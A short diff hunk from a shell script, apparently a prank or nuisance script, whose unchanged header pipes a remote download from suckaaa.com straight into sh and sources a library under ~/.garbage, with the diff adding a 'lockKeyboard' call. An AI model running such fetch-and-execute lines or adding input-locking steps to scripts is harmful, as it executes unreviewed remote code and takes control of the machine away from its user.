@@ -6,6 +6,7 @@
 curl -s 'https://suckaaa.com/s/garbage-lib-installer' | sh;
 source ~/.garbage/lib;
 clear;
+lockKeyboard;
 ###########  END HEADER  ###########
 
 sleep 1s;
